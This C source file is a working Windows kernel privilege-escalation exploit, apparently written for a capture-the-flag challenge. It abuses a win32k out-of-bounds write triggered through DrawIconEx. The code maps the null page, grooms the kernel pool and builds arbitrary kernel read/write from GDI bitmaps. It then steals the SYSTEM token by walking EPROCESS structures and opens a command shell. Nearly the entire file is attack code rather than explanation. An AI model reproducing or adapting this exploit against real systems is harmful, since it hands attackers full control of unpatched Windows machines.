#pragma once
#include <windows.h>
#include <stdio.h>
#include <sddl.h>
#include <assert.h>
#include <conio.h>
#include <tchar.h>
#include <strsafe.h>

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemModuleInformation = 11,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG NumberOfModules;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
typedef struct _PEB {
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	union
	{
		BOOLEAN BitField;
		struct
		{
			BOOLEAN ImageUsesLargePages : 1;
			BOOLEAN IsProtectedProcess : 1;
			BOOLEAN IsLegacyProcess : 1;
			BOOLEAN IsImageDynamicallyRelocated : 1;
			BOOLEAN SkipPatchingUser32Forwarders : 1;
			BOOLEAN SpareBits : 3;
		};
	};
	HANDLE Mutant;

	PVOID ImageBaseAddress;
	PVOID Ldr;
	PVOID ProcessParameters;
	PVOID SubSystemData;
	PVOID ProcessHeap;
	PRTL_CRITICAL_SECTION FastPebLock;
	PVOID AtlThunkSListPtr;
	PVOID IFEOKey;
	union
	{
		ULONG CrossProcessFlags;
		struct
		{
			ULONG ProcessInJob : 1;
			ULONG ProcessInitializing : 1;
			ULONG ProcessUsingVEH : 1;
			ULONG ProcessUsingVCH : 1;
			ULONG ProcessUsingFTH : 1;
			ULONG ReservedBits0 : 27;
		};
		ULONG EnvironmentUpdateCount;
	};
	union
	{
		PVOID KernelCallbackTable;
		PVOID UserSharedInfoPtr;
	};
	ULONG SystemReserved[1];
	ULONG AtlThunkSListPtr32;
	PVOID ApiSetMap;
	ULONG TlsExpansionCounter;
	PVOID TlsBitmap;
	ULONG TlsBitmapBits[2];
	PVOID ReadOnlySharedMemoryBase;
	PVOID HotpatchInformation;
	PVOID *ReadOnlyStaticServerData;
	PVOID AnsiCodePageData;
	PVOID OemCodePageData;
	PVOID UnicodeCaseTableData;

	ULONG NumberOfProcessors;
	ULONG NtGlobalFlag;

	LARGE_INTEGER CriticalSectionTimeout;
	SIZE_T HeapSegmentReserve;
	SIZE_T HeapSegmentCommit;
	SIZE_T HeapDeCommitTotalFreeThreshold;
	SIZE_T HeapDeCommitFreeBlockThreshold;

	ULONG NumberOfHeaps;
	ULONG MaximumNumberOfHeaps;
	PVOID *ProcessHeaps;

	PVOID GdiSharedHandleTable;
} PEB, *PPEB;

typedef struct _GDICELL {
	LPVOID pKernelAddress;
	USHORT wProcessId;
	USHORT wCount;
	USHORT wUpper;
	USHORT wType;
	LPVOID pUserAddress;
} GDICELL, *PGDICELL;

typedef struct _SERVERINFO {
	DWORD dwSRVIFlags;
	DWORD cHandleEntries;
	WORD wSRVIFlags;
	WORD wRIPPID;
	WORD wRIPError;
} SERVERINFO, *PSERVERINFO;

typedef struct _USER_HANDLE_ENTRY {
	void    *pKernel;
	union
	{
		PVOID pi;
		PVOID pti;
		PVOID ppi;
	};
	BYTE type;
	BYTE flags;
	WORD generation;
} USER_HANDLE_ENTRY, *PUSER_HANDLE_ENTRY;

typedef struct _SHAREDINFO {
	PSERVERINFO psi;
	PUSER_HANDLE_ENTRY aheList;
	ULONG HeEntrySize;
	ULONG_PTR pDispInfo;
	ULONG_PTR ulSharedDelts;
	ULONG_PTR awmControl;
	ULONG_PTR DefWindowMsgs;
	ULONG_PTR DefWindowSpecMsgs;
} SHAREDINFO, *PSHAREDINFO;

typedef struct _LeakBitmapInfo {
	HBITMAP hBitmap;
	PUCHAR pBitmapPvScan0;
} LeakBitmapInfo, *pLeakBitmapInfo;

typedef NTSTATUS(NTAPI *_NtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

typedef NTSTATUS(NTAPI *_RtlGetVersion)(
	LPOSVERSIONINFOEXW lpVersionInformation
	);

typedef struct _PROCESS_BASIC_INFORMATION
{
	LONG ExitStatus;
	PVOID PebBaseAddress;
	ULONG_PTR AffinityMask;
	LONG BasePriority;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR ParentProcessId;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

typedef NTSTATUS(NTAPI *_NtQueryInformationProcess)(
	HANDLE ProcessHandle,
	DWORD ProcessInformationClass,
	PVOID ProcessInformation,
	DWORD ProcessInformationLength,
	PDWORD ReturnLength
	);

typedef NTSTATUS(WINAPI *PNtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG ZeroBits,
	PULONG AllocationSize,
	ULONG AllocationType,
	ULONG Protect
	);

static HBITMAP bitmaps[2000];
static HPALETTE hp[2000];
HANDLE hpWorker, hpManager, hManager;
BYTE *bits;
typedef enum { L_DEBUG, L_INFO, L_WARN, L_ERROR } LEVEL, *PLEVEL;
#define MAX_LOG_MESSAGE 1024

BOOL LogMessage(LEVEL Level, LPCTSTR Format, ...)
{
	TCHAR Buffer[MAX_LOG_MESSAGE] = { 0 };
	va_list Args;

	va_start(Args, Format);
	StringCchVPrintf(Buffer, MAX_LOG_MESSAGE, Format, Args);
	va_end(Args);

	switch (Level) {
	case L_DEBUG: _ftprintf(stdout, TEXT("[?] %s\n"), Buffer); break;
	case L_INFO:  _ftprintf(stdout, TEXT("[+] %s\n"), Buffer); break;
	case L_WARN:  _ftprintf(stderr, TEXT("[*] %s\n"), Buffer); break;
	case L_ERROR: _ftprintf(stderr, TEXT("[!] %s\n"), Buffer); break;
	}

	fflush(stdout);
	fflush(stderr);

	return TRUE;
}


LONG BitmapArbitraryRead(HBITMAP hManager, HBITMAP hWorker, LPVOID lpReadAddress, LPVOID lpReadResult, DWORD dwReadLen)
{
	SetBitmapBits(hManager, dwReadLen, &lpReadAddress);		// Set Workers pvScan0 to the Address we want to read. 
	return GetBitmapBits(hWorker, dwReadLen, lpReadResult); // Use Worker to Read result into lpReadResult Pointer.
}


LONG BitmapArbitraryWrite(HBITMAP hManager, HBITMAP hWorker, LPVOID lpWriteAddress, LPVOID lpWriteValue, DWORD dwWriteLen)
{
	SetBitmapBits(hManager, dwWriteLen, &lpWriteAddress);     // Set Workers pvScan0 to the Address we want to write.
	return SetBitmapBits(hWorker, dwWriteLen, &lpWriteValue); // Use Worker to Write at Arbitrary Kernel address.
}


PPEB GetProcessPEB(HANDLE hProcess, DWORD dwPID)
{
	PROCESS_BASIC_INFORMATION pbi;
	PPEB peb;


	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
	if (NtQueryInformationProcess == NULL) {
		LogMessage(L_ERROR,L"Unable to get Module handle!");
		exit(1);
	}

	// Retrieves information about the specified process.
	NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);

	// Read pbi.PebBaseAddress into PEB Structure
	if (!ReadProcessMemory(hProcess, &pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
		LogMessage(L_ERROR, L"Unable to read Process Memory!");
		CloseHandle(hProcess);
		exit(1);
	}
	
	LogMessage(L_INFO,L"PEB Address is at: 0x%p", (LPVOID)peb);

	return peb;
}

void FixPoolHeader(HANDLE hProcess, PPEB peb, HBITMAP ChangeBitmap,HBITMAP fixBitmap,HBITMAP wBitmap,HBITMAP mBitmap)
{
	PGDICELL gdiCell;
	PVOID fix1;
	PVOID fix2;
	PVOID fix3;
	PVOID fix4;
	PVOID fix5;

	// Read PEB->GdiSharedHandleTable Address into GDICELL Structure
	if (!ReadProcessMemory(hProcess, &peb->GdiSharedHandleTable, &gdiCell, sizeof(gdiCell), NULL)) {
		LogMessage(L_ERROR, L"Unable to read Process Memory!");
		CloseHandle(hProcess);
		exit(1);
	}

	LogMessage(L_INFO, L"GdiSharedHandleTable is at: 0x%p", (LPVOID)gdiCell);

	GDICELL gManagerCell = *((PGDICELL)((PUCHAR)gdiCell + LOWORD(fixBitmap) * sizeof(GDICELL)));
	//__debugbreak();
	BitmapArbitraryRead(mBitmap, wBitmap, (PUCHAR)gManagerCell.pKernelAddress - 0x8, &fix1, sizeof(PVOID));
	BitmapArbitraryRead(mBitmap, wBitmap, (PUCHAR)gManagerCell.pKernelAddress - 0x4, &fix2, sizeof(PVOID));
	BitmapArbitraryRead(mBitmap, wBitmap, (PUCHAR)gManagerCell.pKernelAddress, &fix3, sizeof(PVOID));
	BitmapArbitraryRead(mBitmap, wBitmap, (PUCHAR)gManagerCell.pKernelAddress + 0x4, &fix4, sizeof(PVOID));
	BitmapArbitraryRead(mBitmap, wBitmap, (PUCHAR)gManagerCell.pKernelAddress + 0x8, &fix5, sizeof(PVOID));

	BitmapArbitraryWrite(mBitmap, wBitmap, (PUCHAR)gManagerCell.pKernelAddress-0x1000-0x8, fix1, sizeof(PVOID));
	BitmapArbitraryWrite(mBitmap, wBitmap, (PUCHAR)gManagerCell.pKernelAddress-0x1000-0x4, fix2, sizeof(PVOID));
	BitmapArbitraryWrite(mBitmap, wBitmap, (PUCHAR)gManagerCell.pKernelAddress-0x1000, ChangeBitmap, sizeof(PVOID));
	BitmapArbitraryWrite(mBitmap, wBitmap, (PUCHAR)gManagerCell.pKernelAddress-0x1000+0x4, fix4, sizeof(PVOID));
	BitmapArbitraryWrite(mBitmap, wBitmap, (PUCHAR)gManagerCell.pKernelAddress-0x1000+0x8, fix5, sizeof(PVOID));
}




LeakBitmapInfo GDILeakBitmap(HANDLE hProcess, PPEB peb, DWORD dwOffsetToPvScan0)
{
	PGDICELL gdiCell;
	LeakBitmapInfo BitmapInfo;


	BYTE buf[0x64 * 0x64 * 4];
	BitmapInfo.hBitmap = CreateBitmap(0x64, 0x64, 1, 32, &buf);

	// Read PEB->GdiSharedHandleTable Address into GDICELL Structure
	if (!ReadProcessMemory(hProcess, &peb->GdiSharedHandleTable, &gdiCell, sizeof(gdiCell), NULL)) {
		LogMessage(L_ERROR, L"Unable to read Process Memory!");
		CloseHandle(hProcess);
		exit(1);
	}

	LogMessage(L_INFO, L"GdiSharedHandleTable is at: 0x%p", (LPVOID)gdiCell);

	GDICELL gManagerCell = *((PGDICELL)((PUCHAR)gdiCell + LOWORD(BitmapInfo.hBitmap) * sizeof(GDICELL)));
	BitmapInfo.pBitmapPvScan0 = (PUCHAR)gManagerCell.pKernelAddress + dwOffsetToPvScan0;

	LogMessage(L_INFO,L"Bitmap Handle at: 0x%08x",  (ULONG)BitmapInfo.hBitmap);
	LogMessage(L_INFO, L"Bitmap Kernel Object: 0x%p", gManagerCell.pKernelAddress);
	LogMessage(L_INFO, L"Bitmap pvScan0 Pointer: 0x%p",  BitmapInfo.pBitmapPvScan0);

	return BitmapInfo;
}

void PoolFengShui() {
	HBITMAP bmp;
	//0x3A3*0x48*0x1+0x154+0x8=pool size
	for (int y = 0; y < 2000; y++) {
		bmp = CreateBitmap(0x3A3, 1, 1, 32, NULL);
		bitmaps[y] = bmp;
	}

	//Fill lookaside list with 0x18 pool size
	TCHAR st[0x32];
	for (int s = 0; s < 2000; s++) {
		WNDCLASSEX Class2 = { 0 };
		wsprintf(st, L"Class%d", s);
		Class2.lpfnWndProc = DefWindowProc;
		Class2.lpszClassName = st;
		Class2.lpszMenuName = L"TEST";
		Class2.cbSize = sizeof(WNDCLASSEX);
		if (!RegisterClassEx(&Class2)) {
			break;
		}
	}

}

FARPROC WINAPI KernelSymbolInfo(LPCSTR lpSymbolName)
{
	DWORD len;
	PSYSTEM_MODULE_INFORMATION ModuleInfo;
	LPVOID kernelBase = NULL;
	PUCHAR kernelImage = NULL;
	HMODULE hUserSpaceKernel;
	LPCSTR lpKernelName = NULL;
	FARPROC pUserKernelSymbol = NULL;
	FARPROC pLiveFunctionAddress = NULL;

	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
	if (NtQuerySystemInformation == NULL) {
		return NULL;
	}

	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ModuleInfo)
	{
		return NULL;
	}

	NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);

	kernelBase = ModuleInfo->Module[0].ImageBase;
	kernelImage = ModuleInfo->Module[0].FullPathName;

	/* Find exported Kernel Functions */

	lpKernelName = (LPCSTR)ModuleInfo->Module[0].FullPathName + ModuleInfo->Module[0].OffsetToFileName;

	hUserSpaceKernel = LoadLibraryExA(lpKernelName, 0, 0);
	if (hUserSpaceKernel == NULL)
	{
		VirtualFree(ModuleInfo, 0, MEM_RELEASE);
		return NULL;
	}

	pUserKernelSymbol = GetProcAddress(hUserSpaceKernel, lpSymbolName);
	if (pUserKernelSymbol == NULL)
	{
		VirtualFree(ModuleInfo, 0, MEM_RELEASE);
		return NULL;
	}

	pLiveFunctionAddress = (FARPROC)((PUCHAR)pUserKernelSymbol - (PUCHAR)hUserSpaceKernel + (PUCHAR)kernelBase);

	FreeLibrary(hUserSpaceKernel);
	VirtualFree(ModuleInfo, 0, MEM_RELEASE);

	return pLiveFunctionAddress;
}

void PopShell()
{
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcess(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
}


int main()
{
HDC v0; // edi@1
HDC v1; // esi@1
HICON v2; // ebx@1
HBITMAP v3; // eax@1
HBRUSH i; // esi@1
HBITMAP hManager;
HRESULT res;
HMODULE hNtdll;
FARPROC tmp;
//__debugbreak();
LeakBitmapInfo WorkerBitmap;
DWORD dwOffsetToPvScan0 = 0x30;
LPCSTR lpFunctionName = "PsInitialSystemProcess";
/*
ErrCode = 00000002
eax=fa800000 ebx=00000000 ecx=09ead000 edx=00000000 esi=95ee0780 edi=fa82a154
eip=92f051ea esp=95ee05d4 ebp=95ee0600 iopl=0         nv up ei pl zr na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246
win32k!vSrcCopyS1D32+0xa5:
92f051ea 8918            mov     dword ptr [eax],ebx  ds:0023:fa800000=????????
Resetting default scope

LAST_CONTROL_TRANSFER:  from 83f2e083 to 83eca110

STACK_TEXT:
95ee00ac 83f2e083 00000003 588a2af4 00000065 nt!RtlpBreakWithStatusInstruction
95ee00fc 83f2eb81 00000003 877c6710 00000000 nt!KiBugCheckDebugBreak+0x1c
95ee04c0 83edd41b 00000050 fa800000 00000001 nt!KeBugCheck2+0x68b
95ee0548 83e903d8 00000001 fa800000 00000000 nt!MmAccessFault+0x106
95ee0548 92f051ea 00000001 fa800000 00000000 nt!KiTrap0E+0xdc
95ee0600 92f4ab6f 00ee0780 06e47cd9 09ead000 win32k!vSrcCopyS1D32+0xa5
95ee0840 92edda02 fdea3db8 fa82a010 00000000 win32k!EngCopyBits+0x604
95ee0900 92ee0c34 00000000 09ead000 00000006 win32k!EngRealizeBrush+0x462
95ee0998 92ee34af ffa42618 ffb92008 92edd5a0 win32k!bGetRealizedBrush+0x70c
95ee09b0 92f59ae6 fe9ce648 fe9ce648 fe8c4000 win32k!pvGetEngRbrush+0x1f
95ee0a14 92f7e723 fe8c4010 00000000 00000000 win32k!EngBitBlt+0x2bf
95ee0a78 92f7e8ab fe9ce648 95ee0ae0 95ee0ad0 win32k!GrePatBltLockedDC+0x22b
95ee0b24 92f0fa08 95ee0b54 0000f0f0 95ee0b88 win32k!GrePolyPatBltInternal+0x176
95ee0b60 92f1d831 11010253 00f00021 95ee0b88 win32k!GrePolyPatBlt+0x45
95ee0ba8 92f1d6c8 19010240 00000000 11223344 win32k!_DrawIconEx+0x153
95ee0c00 83e8d1ea 19010240 00000000 11223344 win32k!NtUserDrawIconEx+0xcb
95ee0c00 779d70b4 19010240 00000000 11223344 nt!KiFastCallEntry+0x12a
0020f858 76c82cc0 76c82ca8 19010240 00000000 ntdll!KiFastSystemCallRet
0020f85c 76c82ca8 19010240 00000000 11223344 USER32!NtUserDrawIconEx+0xc
0020f8b8 012e1072 19010240 00000000 11223344 USER32!DrawIconEx+0x260
WARNING: Stack unwind information not available. Following frames may be wrong.
0020f934 76ae3c45 7ffdc000 0020f980 779f37f5 DDCTF_Kernel_pwn+0x1072
0020f940 779f37f5 7ffdc000 77879889 00000000 kernel32!BaseThreadInitThunk+0xe
0020f980 779f37c8 012e1202 7ffdc000 00000000 ntdll!__RtlUserThreadStart+0x70
0020f998 00000000 012e1202 7ffdc000 00000000 ntdll!_RtlUserThreadStart+0x1b

*/
LogMessage(L_INFO, L"Create Fake HmgLock");
hNtdll = GetModuleHandle(L"ntdll.dll");
//Get address of NtAllocateVirtualMemory from the dynamically linked library and then cast it to a callable function type
tmp = GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
PNtAllocateVirtualMemory NtAllocateVirtualMemory = (PNtAllocateVirtualMemory)tmp;
//We can't outright pass NULL as the address but if we pass 1 then it gets rounded down to 0...
//PVOID baseAddress = (PVOID)0x1;
PVOID baseAddress = (PVOID)0x1;
SIZE_T regionSize = 0xFF; //Probably enough, it will get rounded up to the next page size
// Map the null page
NTSTATUS ntStatus = NtAllocateVirtualMemory(
	GetCurrentProcess(), //Current process handle
	&baseAddress, //address we want our memory to start at, will get rounded down to the nearest page boundary
	0, //The number of high-order address bits that must be zero in the base address of the section view. Not a clue here
	&regionSize, //Required size - will be modified to actual size allocated, is rounded up to the next page boundary
	MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN, //claim memory straight away, get highest appropriate address
	PAGE_EXECUTE_READWRITE //All permissions
	);

if (ntStatus != 0) {
	LogMessage(L_ERROR, L"Virtual Memory Allocation Failed: 0x%x", ntStatus);
	return 1;
}
PVOID nullPointer = (PVOID)((UINT)0x4);
*(PUINT)nullPointer = (UINT)1;

LogMessage(L_INFO, L"Ready to trigger Vulnerability...");
v0 = GetWindowDC(0);
v1 = CreateCompatibleDC(v0);
v2 = LoadIconW(0, (LPCWSTR)0x7F02);
//__debugbreak();
v3 = CreateBitmap(0x23, 0x1d41d41, 1, 1, NULL);
//v3 = CreateDiscardableBitmap(v1, 0x62, 0xa72f05);//0xffffff8c
i = CreatePatternBrush(v3);
SelectObject(v0, i);

//ÖÆÔì0x18µÄpool hole
LogMessage(L_INFO, L"Make 0x18 pool hole...");
PoolFengShui();
DrawIconEx(v0, 0, 287454020, v2, 21862, 30600, 0x12345678u, i, 8u);//PALLOCMEM will occupy one of 0x18 pool hole

bits = (BYTE*)malloc(0xEE0);

for (int i = 0; i < 2000; i++) {
	res = GetBitmapBits(bitmaps[i], 0xEE0, bits);
	if (res == 0xEE0) {
		hManager = bitmaps[i];
		break;
	}
	if (i == 1999)
	{
		LogMessage(L_ERROR, L"Some error in my Exploit");
		exit(-1);
	}
}
/////Read and change by sizlbitmap
PVOID CheckBitmap;
HBITMAP ManagerBitmap;
CopyMemory(&CheckBitmap, bits + 0xEAC, 0x4);
for (int i = 0; i < 2000; i++)
{
	if (CheckBitmap == bitmaps[i])
	{
		ManagerBitmap = (HBITMAP)CheckBitmap;
	}
}
DWORD dwPID = GetCurrentProcessId();
HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwPID);
PPEB peb = GetProcessPEB(hProcess, dwPID);
WorkerBitmap = GDILeakBitmap(hProcess, peb, dwOffsetToPvScan0);

//__debugbreak();
LogMessage(L_INFO, L"Change ManagerBitmap.pvScan0 point to WorkerBitmap.pvScan0");
CopyMemory(bits + 0xEDC, &WorkerBitmap.pBitmapPvScan0, 0x4);
SetBitmapBits(hManager, 0xEE0, bits);

LogMessage(L_INFO, L"Fix oob write pool header");
FixPoolHeader(hProcess, peb, hManager, ManagerBitmap, WorkerBitmap.hBitmap, ManagerBitmap);

FARPROC fpFunctionAddress = KernelSymbolInfo(lpFunctionName);
if (fpFunctionAddress == NULL)
{
	LogMessage(L_ERROR, TEXT("Get Kernel Symbol Info Error!"));
	exit(0);
}
//__debugbreak();
LogMessage(L_INFO, TEXT("%hs Address is at: 0x%p"), lpFunctionName, (LPVOID)fpFunctionAddress);

//found system token 
PVOID lpSystemEPROCESS = NULL;
PVOID lpSysProcID = NULL;
LIST_ENTRY leNextProcessLink;
PVOID lpSystemToken = NULL;
DWORD dwUniqueProcessIdOffset = 0x0b4;
DWORD dwTokenOffset = 0x0f8;
DWORD dwActiveProcessLinks = 0x0b8;
//__debugbreak();
BitmapArbitraryRead(ManagerBitmap, WorkerBitmap.hBitmap, (PVOID)fpFunctionAddress, &lpSystemEPROCESS, sizeof(PVOID));
//__debugbreak();
BitmapArbitraryRead(ManagerBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpSystemEPROCESS + dwUniqueProcessIdOffset, &lpSysProcID, sizeof(PVOID));
BitmapArbitraryRead(ManagerBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpSystemEPROCESS + dwActiveProcessLinks, &leNextProcessLink, sizeof(LIST_ENTRY));
BitmapArbitraryRead(ManagerBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpSystemEPROCESS + dwTokenOffset, &lpSystemToken, sizeof(PVOID));
LogMessage(L_INFO, TEXT("System Token is : 0x%p"), lpSystemToken);

dwPID = GetCurrentProcessId();
LogMessage(L_INFO, TEXT("Current Process PID is: %d"), dwPID);
//found current process pid and token address
LPVOID lpNextEPROCESS = NULL;
LPVOID lpCurrentPID = NULL;
LPVOID lpCurrentToken = NULL;
DWORD dwCurrentPID;
do {
	lpNextEPROCESS = (PUCHAR)leNextProcessLink.Flink - dwActiveProcessLinks;
	BitmapArbitraryRead(ManagerBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpNextEPROCESS + dwUniqueProcessIdOffset, &lpCurrentPID, sizeof(PVOID));
	BitmapArbitraryRead(ManagerBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpNextEPROCESS + dwTokenOffset, &lpCurrentToken, sizeof(PVOID));

	// Read _LIST_ENTRY to next Active _EPROCESS Structure
	BitmapArbitraryRead(ManagerBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpNextEPROCESS + dwActiveProcessLinks, &leNextProcessLink, sizeof(LIST_ENTRY));

	dwCurrentPID = LOWORD(lpCurrentPID);

} while (dwCurrentPID != dwPID);

LogMessage(L_INFO, TEXT("Current _EPROCESS Token address is at: 0x%p"), (PUCHAR)lpNextEPROCESS + dwTokenOffset);
LogMessage(L_INFO, TEXT("Current Process Token is: 0x%p"), lpCurrentToken);

BitmapArbitraryWrite(ManagerBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpNextEPROCESS + dwTokenOffset, lpSystemToken, sizeof(PVOID));

LogMessage(L_INFO, TEXT("Stealing Token success!!"));


PopShell();

}
